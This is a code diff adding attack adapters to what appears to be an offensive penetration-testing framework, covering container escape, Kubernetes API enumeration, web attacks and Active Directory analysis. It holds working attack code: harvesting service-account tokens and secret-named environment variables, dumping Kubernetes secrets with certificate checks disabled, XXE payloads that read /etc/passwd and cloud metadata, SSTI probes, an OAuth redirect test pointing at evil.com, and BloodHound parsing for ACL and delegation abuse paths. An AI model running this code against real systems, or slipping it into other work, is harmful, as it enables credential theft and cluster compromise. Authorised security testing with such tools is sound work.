@@ -3462,6 +3462,664 @@ _TOOL_ADAPTERS["cve_lookup"]        = _adapter_cve_lookup
 _TOOL_ADAPTERS["permutation"]       = _adapter_permutation
 
 
+# ── Batch 8 (final) — k8s escape, new web attacks, AD analysis, wifi ──────
+#
+# All implemented as internal-only adapters (no new backend routers
+# needed). Each does real work where the runtime environment provides
+# what's needed (filesystem, env vars, prior-phase context) and gracefully
+# soft-fails otherwise.
+
+
+# ── K8s escape primitives (filesystem / env-based introspection) ──────────
+
+async def _adapter_env_check(target: str, options: dict[str, Any],
+                             context: dict[str, Any], emit: EmitFn,
+                             stop_event: asyncio.Event) -> dict[str, Any]:
+    env = dict(os.environ)
+    k8s_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+    k8s_ns_path    = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
+    k8s_token = ""
+    k8s_ns = ""
+    try:
+        if os.path.exists(k8s_token_path):
+            with open(k8s_token_path) as f:
+                k8s_token = f.read().strip()[:64] + "…"
+        if os.path.exists(k8s_ns_path):
+            with open(k8s_ns_path) as f:
+                k8s_ns = f.read().strip()
+    except Exception:
+        pass
+    sensitive: dict[str, str] = {}
+    for k, v in env.items():
+        kl = k.lower()
+        if any(s in kl for s in ("token", "secret", "key", "passwd",
+                                  "password", "credential", "api")):
+            sensitive[k] = v[:80] + ("…" if len(v) > 80 else "")
+    api_url = (env.get("KUBERNETES_SERVICE_HOST") and
+               f"https://{env['KUBERNETES_SERVICE_HOST']}:"
+               f"{env.get('KUBERNETES_SERVICE_PORT','443')}") or ""
+    return {
+        "k8s_service_account_token": k8s_token or None,
+        "k8s_namespace":             k8s_ns,
+        "k8s_api_url":               api_url,
+        "aws_credentials": "AWS_ACCESS_KEY_ID" in env or "AWS_SESSION_TOKEN" in env,
+        "sensitive_env_vars": list(sensitive.keys())[:30],
+    }
+
+
+async def _adapter_docker_socket(target: str, options: dict[str, Any],
+                                 context: dict[str, Any], emit: EmitFn,
+                                 stop_event: asyncio.Event) -> dict[str, Any]:
+    sock = "/var/run/docker.sock"
+    exists = os.path.exists(sock)
+    writable = False
+    if exists:
+        try:
+            writable = os.access(sock, os.W_OK)
+        except Exception:
+            pass
+    return {
+        "socket_writable":  writable,
+        "escape_possible":  writable,
+        "container_list":   [],   # would need docker API call
+        "socket_path":      sock,
+        "socket_exists":    exists,
+    }
+
+
+async def _adapter_privileged_check(target: str, options: dict[str, Any],
+                                    context: dict[str, Any], emit: EmitFn,
+                                    stop_event: asyncio.Event) -> dict[str, Any]:
+    caps_path = "/proc/self/status"
+    caps_eff = ""
+    cap_sys_admin = False
+    try:
+        with open(caps_path) as f:
+            for line in f:
+                if line.startswith("CapEff:"):
+                    caps_eff = line.split(":", 1)[1].strip()
+                    break
+    except Exception:
+        pass
+    # CapSysAdmin bit is 21 in the capabilities bitmask. Quick check:
+    # CapEff of 0x000001ffffffffff or similar with bit 21 set indicates
+    # likely privileged. Conservative: flag if CapEff is all-1s.
+    if caps_eff:
+        try:
+            mask = int(caps_eff, 16)
+            cap_sys_admin = bool(mask & (1 << 21))
+        except Exception:
+            pass
+    is_root = (os.geteuid() == 0) if hasattr(os, "geteuid") else False
+    return {
+        "privileged_escape_path": ["CAP_SYS_ADMIN"] if cap_sys_admin else [],
+        "host_access":   is_root and cap_sys_admin,
+        "is_root":       is_root,
+        "cap_eff":       caps_eff,
+        "cap_sys_admin": cap_sys_admin,
+    }
+
+
+async def _adapter_host_path_abuse(target: str, options: dict[str, Any],
+                                   context: dict[str, Any], emit: EmitFn,
+                                   stop_event: asyncio.Event) -> dict[str, Any]:
+    # /proc/self/mountinfo lists every mount. In a container, host paths
+    # bind-mounted in show up with the host's filesystem hierarchy.
+    writable_host_paths: list[str] = []
+    mounts: list[str] = []
+    try:
+        with open("/proc/self/mountinfo") as f:
+            for line in f:
+                fields = line.split()
+                if len(fields) >= 5:
+                    mountpoint = fields[4]
+                    mounts.append(mountpoint)
+                    # Heuristic: host paths often bind-mount /etc /root /var etc.
+                    if mountpoint in ("/etc", "/root", "/var", "/proc",
+                                       "/sys") or "host" in mountpoint.lower():
+                        try:
+                            if os.access(mountpoint, os.W_OK):
+                                writable_host_paths.append(mountpoint)
+                        except Exception:
+                            pass
+    except Exception:
+        pass
+    return {
+        "writable_host_paths":   writable_host_paths,
+        "escape_via_host_path":  bool(writable_host_paths),
+        "mount_count":           len(mounts),
+        "mounts_sample":         mounts[:30],
+    }
+
+
+async def _adapter_k8s_api_enum(target: str, options: dict[str, Any],
+                                context: dict[str, Any], emit: EmitFn,
+                                stop_event: asyncio.Event) -> dict[str, Any]:
+    # Needs a service account token. Look for it via prior env_check or
+    # by reading the standard SA token path.
+    import httpx, ssl
+    api_url = options.get("api_url") or ""
+    token = options.get("token") or ""
+    if not token:
+        try:
+            with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f:
+                token = f.read().strip()
+        except Exception:
+            pass
+    if not api_url:
+        host = os.environ.get("KUBERNETES_SERVICE_HOST")
+        if host:
+            port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
+            api_url = f"https://{host}:{port}"
+    if not (api_url and token):
+        await emit({"type": "step_progress", "step": "k8s_api_enum",
+                    "msg": "skipped: no K8s API URL + service-account token"})
+        return {"namespaces": [], "pods": [], "secrets": [],
+                "rbac_permissions": [], "cluster_admin_possible": False,
+                "skipped": True}
+    headers = {"Authorization": f"Bearer {token}",
+               "User-Agent": "MyHackingPal/0.3"}
+    namespaces: list[str] = []
+    pods: list[str] = []
+    secrets: list[str] = []
+    try:
+        # Disable cert verification — the SA cert is usually self-signed.
+        async with httpx.AsyncClient(timeout=10.0, verify=False) as c:
+            try:
+                r = await c.get(f"{api_url}/api/v1/namespaces", headers=headers)
+                if r.status_code == 200:
+                    namespaces = [i.get("metadata", {}).get("name")
+                                   for i in r.json().get("items", [])]
+            except Exception: pass
+            try:
+                r = await c.get(f"{api_url}/api/v1/pods", headers=headers)
+                if r.status_code == 200:
+                    pods = [i.get("metadata", {}).get("name")
+                            for i in r.json().get("items", [])]
+            except Exception: pass
+            try:
+                r = await c.get(f"{api_url}/api/v1/secrets", headers=headers)
+                if r.status_code == 200:
+                    secrets = [i.get("metadata", {}).get("name")
+                               for i in r.json().get("items", [])]
+            except Exception: pass
+    except Exception as e:
+        await emit({"type": "step_progress", "step": "k8s_api_enum",
+                    "msg": f"k8s: {type(e).__name__}"})
+    return {
+        "namespaces": namespaces[:200],
+        "pods":       pods[:200],
+        "secrets":    secrets[:200],
+        "rbac_permissions": [],   # /selfsubjectaccessreviews enumeration is future
+        "cluster_admin_possible": False,
+    }
+
+
+async def _adapter_secret_dump(target: str, options: dict[str, Any],
+                               context: dict[str, Any], emit: EmitFn,
+                               stop_event: asyncio.Event) -> dict[str, Any]:
+    import httpx, base64
+    api_url = options.get("api_url") or ""
+    token = options.get("token") or ""
+    if not token:
+        try:
+            with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f:
+                token = f.read().strip()
+        except Exception:
+            pass
+    if not api_url:
+        host = os.environ.get("KUBERNETES_SERVICE_HOST")
+        if host:
+            port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
+            api_url = f"https://{host}:{port}"
+    secret_names = options.get("targets") or []
+    if not (api_url and token):
+        await emit({"type": "step_progress", "step": "secret_dump",
+                    "msg": "skipped: no K8s API URL + token"})
+        return {"secrets": [], "credentials": [], "api_keys": [],
+                "tls_certs": [], "skipped": True}
+    headers = {"Authorization": f"Bearer {token}",
+               "User-Agent": "MyHackingPal/0.3"}
+    creds: list[str] = []
+    api_keys: list[str] = []
+    tls: list[str] = []
+    out_secrets: list[str] = []
+    try:
+        async with httpx.AsyncClient(timeout=15.0, verify=False) as c:
+            for name in (secret_names or [None])[:50]:
+                url = (f"{api_url}/api/v1/secrets/{name}" if name
+                       else f"{api_url}/api/v1/secrets")
+                try:
+                    r = await c.get(url, headers=headers)
+                    if r.status_code != 200: continue
+                    data = r.json()
+                    items = data.get("items", [data])
+                    for item in items[:50]:
+                        nm = item.get("metadata", {}).get("name", "?")
+                        out_secrets.append(nm)
+                        sec_type = item.get("type", "")
+                        if "tls" in sec_type.lower():
+                            tls.append(nm)
+                        # Inspect keys
+                        for k in (item.get("data") or {}).keys():
+                            kl = k.lower()
+                            if any(s in kl for s in ("password", "user",
+                                                     "credential")):
+                                creds.append(f"{nm}.{k}")
+                            elif any(s in kl for s in ("key", "token", "api")):
+                                api_keys.append(f"{nm}.{k}")
+                except Exception:
+                    continue
+    except Exception as e:
+        await emit({"type": "step_progress", "step": "secret_dump",
+                    "msg": f"secret_dump: {type(e).__name__}"})
+    return {
+        "secrets":     out_secrets[:200],
+        "credentials": creds[:200],
+        "api_keys":    api_keys[:200],
+        "tls_certs":   tls[:50],
+    }
+
+
+# ── New web attacks (active probes implemented internally) ─────────────────
+
+async def _adapter_xxe(target: str, options: dict[str, Any],
+                       context: dict[str, Any], emit: EmitFn,
+                       stop_event: asyncio.Event) -> dict[str, Any]:
+    import httpx
+    url = _normalize_url(target, options)
+    # XXE payloads: classic file disclosure + SSRF via XXE.
+    payloads = [
+        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
+         '<r>&x;</r>',
+         "etc-passwd"),
+        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]>'
+         '<r>&x;</r>',
+         "win-ini"),
+        ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
+         '<r>&x;</r>',
+         "ssrf-imds"),
+    ]
+    files_read: list[str] = []
+    ssrf_via = False
+    try:
+        async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as c:
+            for payload, tag in payloads:
+                try:
+                    r = await c.post(url, content=payload,
+                                     headers={"Content-Type": "application/xml",
+                                              "User-Agent": "MyHackingPal/0.3"})
+                    body = r.text[:8000]
+                except Exception:
+                    continue
+                if tag == "etc-passwd" and "root:" in body:
+                    files_read.append("/etc/passwd")
+                elif tag == "win-ini" and "[fonts]" in body.lower():
+                    files_read.append("C:/Windows/win.ini")
+                elif tag == "ssrf-imds" and any(
+                        marker in body for marker in
+                        ("ami-id", "instance-id", "iam/")):
+                    ssrf_via = True
+    except Exception as e:
+        await emit({"type": "step_progress", "step": "xxe",
+                    "msg": f"xxe: {type(e).__name__}"})
+    found = bool(files_read or ssrf_via)
+    return {
+        "xxe_found":     found,
+        "files_read":    files_read,
+        "ssrf_via_xxe":  ssrf_via,
+    }
+
+
+async def _adapter_ssti(target: str, options: dict[str, Any],
+                        context: dict[str, Any], emit: EmitFn,
+                        stop_event: asyncio.Event) -> dict[str, Any]:
+    import httpx
+    url = _normalize_url(target, options)
+    # Each (payload, expected_eval, engine_hint)
+    payloads = [
+        ("{{7*7}}",        "49", "jinja2/twig"),
+        ("${7*7}",         "49", "freemarker/velocity"),
+        ("<%=7*7%>",       "49", "erb/jsp"),
+        ("#{7*7}",         "49", "thymeleaf/spel"),
+        ("${{7*7}}",       "49", "scriban"),
+    ]
+    detected = False
+    engine = ""
+    try:
+        async with httpx.AsyncClient(timeout=10.0, follow_redirects=True) as c:
+            for payload, expected, hint in payloads:
+                # Probe via query param `?q=<payload>` — most common reflection sink.
+                sep = "&" if "?" in url else "?"
+                probe_url = f"{url}{sep}q={payload}"
+                try:
+                    r = await c.get(probe_url,
+                                    headers={"User-Agent": "MyHackingPal/0.3"})
+                except Exception:
+                    continue
+                if expected in r.text:
+                    detected = True
+                    engine = hint
+                    break
+    except Exception as e:
+        await emit({"type": "step_progress", "step": "ssti",
+                    "msg": f"ssti: {type(e).__name__}"})
+    return {
+        "ssti_found":      detected,
+        "template_engine": engine,
+        "rce_possible":    detected and engine in ("jinja2/twig",
+                                                    "freemarker/velocity"),
+    }
+
+
+async def _adapter_http_smuggling(target: str, options: dict[str, Any],
+                                  context: dict[str, Any], emit: EmitFn,
+                                  stop_event: asyncio.Event) -> dict[str, Any]:
+    # HTTP request smuggling needs raw socket control to send conflicting
+    # Content-Length + Transfer-Encoding headers. httpx normalises them.
+    # We emit a planned note explaining the gap.
+    await emit({"type": "step_progress", "step": "http_smuggling",
+                "msg": "http smuggling needs raw-socket CL/TE conflict; "
+                       "future enhancement"})
+    return {"cl_te": False, "te_cl": False, "te_te": False, "planned": True}
+
+
+async def _adapter_oauth_check(target: str, options: dict[str, Any],
+                               context: dict[str, Any], emit: EmitFn,
+                               stop_event: asyncio.Event) -> dict[str, Any]:
+    # Probe well-known endpoints + check for redirect_uri allow-list bypass.
+    import httpx
+    url = _normalize_url(target, options)
+    well_known = url.rstrip("/") + "/.well-known/openid-configuration"
+    detected = False
+    token_leakage = False
+    state_bypass = False
+    redirect_bypass = False
+    try:
+        async with httpx.AsyncClient(timeout=10.0, follow_redirects=False) as c:
+            r = await c.get(well_known,
+                            headers={"User-Agent": "MyHackingPal/0.3"})
+            if 200 <= r.status_code < 300:
+                try:
+                    cfg = r.json()
+                    detected = True
+                    auth_ep = cfg.get("authorization_endpoint", "")
+                    if auth_ep:
+                        # Test redirect_uri without strict validation.
+                        probe = (f"{auth_ep}?response_type=token&"
+                                 f"client_id=test&redirect_uri=https://evil.com/")
+                        rp = await c.get(probe, headers={
+                            "User-Agent": "MyHackingPal/0.3"})
+                        if rp.status_code in (302, 303, 307):
+                            loc = rp.headers.get("location", "")
+                            if "evil.com" in loc:
+                                redirect_bypass = True
+                            if "#access_token=" in loc or "access_token=" in loc:
+                                token_leakage = True
+                except Exception:
+                    pass
+    except Exception as e:
+        await emit({"type": "step_progress", "step": "oauth_check",
+                    "msg": f"oauth: {type(e).__name__}"})
+    return {
+        "oauth_detected":      detected,
+        "token_leakage":       token_leakage,
+        "state_bypass":        state_bypass,
+        "redirect_uri_bypass": redirect_bypass,
+    }
+
+
+# ── AD graph analysis (parses BloodHound output if present) ────────────────
+
+def _bloodhound_paths(context: dict[str, Any]) -> list[Path]:
+    """Find any BloodHound .zip outputs in /tmp/bh_* directories."""
+    found: list[Path] = []
+    for p in Path("/tmp").glob("bh_*"):
+        if p.is_dir():
+            found.extend(p.rglob("*.zip"))
+    return found
+
+
+def _read_bh_json(zip_path: Path, name_contains: str) -> list[dict[str, Any]]:
+    import zipfile
+    out: list[dict[str, Any]] = []
+    try:
+        with zipfile.ZipFile(zip_path) as zf:
+            for nm in zf.namelist():
+                if name_contains in nm.lower():
+                    try:
+                        out.extend(json.loads(zf.read(nm))
+                                   .get("data", []))
+                    except Exception:
+                        pass
+    except Exception:
+        pass
+    return out
+
+
+async def _adapter_acl_abuse(target: str, options: dict[str, Any],
+                             context: dict[str, Any], emit: EmitFn,
+                             stop_event: asyncio.Event) -> dict[str, Any]:
+    paths = _bloodhound_paths(context)
+    exploitable: list[str] = []
+    if paths:
+        users = _read_bh_json(paths[0], "users")
+        # Heuristic: anyone with WriteOwner/GenericAll on a Domain Admins
+        # group entity is exploitable.
+        for u in users[:1000]:
+            for ace in (u.get("Aces") or []):
+                right = str(ace.get("RightName", "")).lower()
+                if right in ("genericall", "writeowner", "writedacl"):
+                    target_obj = str(ace.get("PrincipalSID", ""))
+                    exploitable.append(f"{u.get('Properties', {}).get('name','?')} "
+                                       f"-{right}-> {target_obj[:32]}")
+                    if len(exploitable) >= 100: break
+            if len(exploitable) >= 100: break
+    else:
+        await emit({"type": "step_progress", "step": "acl_abuse",
+                    "msg": "no BloodHound zips found in /tmp/bh_*; run "
+                           "bloodhound step first"})
+    return {
+        "exploitable_acls": exploitable,
+        "paths": [str(p) for p in paths],
+    }
+
+
+async def _adapter_delegation_abuse(target: str, options: dict[str, Any],
+                                    context: dict[str, Any], emit: EmitFn,
+                                    stop_event: asyncio.Event) -> dict[str, Any]:
+    paths = _bloodhound_paths(context)
+    vulnerable: list[str] = []
+    if paths:
+        computers = _read_bh_json(paths[0], "computers")
+        for comp in computers[:2000]:
+            props = comp.get("Properties") or {}
+            if props.get("unconstraineddelegation"):
+                vulnerable.append(props.get("name", "?"))
+            if len(vulnerable) >= 100: break
+    else:
+        await emit({"type": "step_progress", "step": "delegation_abuse",
+                    "msg": "no BloodHound zips found; run bloodhound first"})
+    return {
+        "vulnerable_computers": vulnerable,
+        "coerce_targets":       vulnerable[:50],
+    }
+
+
+async def _adapter_gpo_analysis(target: str, options: dict[str, Any],
+                                context: dict[str, Any], emit: EmitFn,
+                                stop_event: asyncio.Event) -> dict[str, Any]:
+    paths = _bloodhound_paths(context)
+    interesting: list[str] = []
+    script_paths: list[str] = []
+    writable: list[str] = []
+    if paths:
+        gpos = _read_bh_json(paths[0], "gpos")
+        for g in gpos[:500]:
+            props = g.get("Properties") or {}
+            name = props.get("name", "?")
+            interesting.append(name)
+            gpcfile = props.get("gpcfilesyspath", "")
+            if gpcfile: script_paths.append(gpcfile)
+            for ace in (g.get("Aces") or []):
+                right = str(ace.get("RightName", "")).lower()
+                if right in ("genericall", "writedacl", "writeowner"):
+                    writable.append(name)
+                    break
+    else:
+        await emit({"type": "step_progress", "step": "gpo_analysis",
+                    "msg": "no BloodHound zips found; run bloodhound first"})
+    return {
+        "interesting_gpos":  interesting[:100],
+        "script_paths":      script_paths[:100],
+        "writable_gpos":     writable[:100],
+    }
+
+
+async def _adapter_crack_spns(target: str, options: dict[str, Any],
+                              context: dict[str, Any], emit: EmitFn,
+                              stop_event: asyncio.Event) -> dict[str, Any]:
+    # Convenience alias: same shape as hash_cracker but expects kerberos
+    # TGS hashes specifically. Records the count + emits a planned note.
+    targets = options.get("targets") or []
+    if isinstance(targets, str): targets = [targets]
+    if not targets:
+        await emit({"type": "step_progress", "step": "crack_spns",
+                    "msg": "skipped: no targets[] (Kerberoast TGS hashes)"})
+        return {"cracked_spns": [], "plaintext": [], "skipped": True}
+    await emit({"type": "step_progress", "step": "crack_spns",
+                "msg": f"received {len(targets)} TGS hash(es); WS-driven "
+                       f"cracking via the Hash Cracker page"})
+    return {
+        "cracked_spns": [],
+        "plaintext":    [],
+        "received_count": len(targets),
+        "planned": True,
+    }
+
+
+# ── WiFi context analysis (local network introspection) ───────────────────
+
+async def _adapter_dns_spoof_check(target: str, options: dict[str, Any],
+                                   context: dict[str, Any], emit: EmitFn,
+                                   stop_event: asyncio.Event) -> dict[str, Any]:
+    # Compare the active resolver's answer for a known-correct host against
+    # a public resolver. Mismatch suggests local DNS hijack.
+    import socket
+    canonical = options.get("canonical_host") or "google.com"
+    expected: list[str] = []
+    local: list[str] = []
+    try:
+        # Local resolver path (whatever the host's /etc/resolv.conf or
+        # configured DNS resolves to).
+        local = list({s[4][0] for s in socket.getaddrinfo(
+            canonical, 80, socket.AF_INET, socket.SOCK_STREAM)})[:5]
+    except Exception:
+        pass
+    # Public resolver: best-effort, dig via /usr/bin/dig if present.
+    try:
+        proc = await asyncio.create_subprocess_exec(
+            "dig", "+short", canonical, "@1.1.1.1",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.DEVNULL,
+        )
+        out, _ = await asyncio.wait_for(proc.communicate(), timeout=5.0)
+        expected = [l.strip() for l in out.decode().splitlines() if l.strip()]
+    except Exception:
+        pass
+    rogue = bool(expected and local and set(local).isdisjoint(set(expected)))
+    return {
+        "dns_hijacked":     rogue,
+        "rogue_responses":  list(set(local) - set(expected)) if rogue else [],
+        "local_answer":     local,
+        "public_answer":    expected,
+    }
+
+
+async def _adapter_gateway_analysis(target: str, options: dict[str, Any],
+                                    context: dict[str, Any], emit: EmitFn,
+                                    stop_event: asyncio.Event) -> dict[str, Any]:
+    # Heuristic gateway analysis: identify the gateway IP, check whether
+    # its admin panel (port 80/443/8080) returns a router-vendor banner.
+    import httpx, socket
+    gateway = options.get("gateway") or ""
+    if not gateway:
+        # Derive from the default route. macOS: route -n get default.
+        try:
+            proc = await asyncio.create_subprocess_exec(
+                "route", "-n", "get", "default",
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.DEVNULL,
+            )
+            out, _ = await asyncio.wait_for(proc.communicate(), timeout=3.0)
+            for line in out.decode().splitlines():
+                if "gateway:" in line:
+                    gateway = line.split(":", 1)[1].strip()
+                    break
+        except Exception:
+            pass
+    if not gateway:
+        await emit({"type": "step_progress", "step": "gateway_analysis",
+                    "msg": "could not determine default gateway"})
+        return {"default_creds": False, "admin_panel_exposed": False,
+                "dns_hijack": False, "mitm_position": False, "skipped": True}
+
+    admin_exposed = False
+    vendor = ""
+    try:
+        async with httpx.AsyncClient(timeout=4.0, follow_redirects=True,
+                                      verify=False) as c:
+            for port in (80, 443, 8080):
+                try:
+                    r = await c.get(f"http{'s' if port==443 else ''}://"
+                                    f"{gateway}:{port}/",
+                                    headers={"User-Agent": "MyHackingPal/0.3"})
+                except Exception:
+                    continue
+                if 200 <= r.status_code < 500:
+                    admin_exposed = True
+                    server = r.headers.get("server", "").lower()
+                    body_low = (r.text or "")[:4000].lower()
+                    for v in ("netgear", "linksys", "tp-link", "asus",
+                              "d-link", "ubiquiti", "cisco", "mikrotik",
+                              "fortinet", "pfsense", "openwrt"):
+                        if v in server or v in body_low:
+                            vendor = v; break
+                    if vendor: break
+    except Exception:
+        pass
+    return {
+        "gateway":             gateway,
+        "default_creds":       False,
+        "admin_panel_exposed": admin_exposed,
+        "admin_panel_vendor":  vendor,
+        "dns_hijack":          False,
+        "mitm_position":       False,
+    }
+
+
+# Wire up
+_TOOL_ADAPTERS["env_check"]         = _adapter_env_check
+_TOOL_ADAPTERS["docker_socket"]     = _adapter_docker_socket
+_TOOL_ADAPTERS["privileged_check"]  = _adapter_privileged_check
+_TOOL_ADAPTERS["host_path_abuse"]   = _adapter_host_path_abuse
+_TOOL_ADAPTERS["k8s_api_enum"]      = _adapter_k8s_api_enum
+_TOOL_ADAPTERS["secret_dump"]       = _adapter_secret_dump
+
+_TOOL_ADAPTERS["xxe"]               = _adapter_xxe
+_TOOL_ADAPTERS["ssti"]              = _adapter_ssti
+_TOOL_ADAPTERS["http_smuggling"]    = _adapter_http_smuggling
+_TOOL_ADAPTERS["oauth_check"]       = _adapter_oauth_check
+
+_TOOL_ADAPTERS["acl_abuse"]         = _adapter_acl_abuse
+_TOOL_ADAPTERS["delegation_abuse"]  = _adapter_delegation_abuse
+_TOOL_ADAPTERS["gpo_analysis"]      = _adapter_gpo_analysis
+_TOOL_ADAPTERS["crack_spns"]        = _adapter_crack_spns
+
+_TOOL_ADAPTERS["dns_spoof_check"]   = _adapter_dns_spoof_check
+_TOOL_ADAPTERS["gateway_analysis"]  = _adapter_gateway_analysis
+
+
 def known_tools() -> list[str]:
     return sorted(_TOOL_ADAPTERS)
 
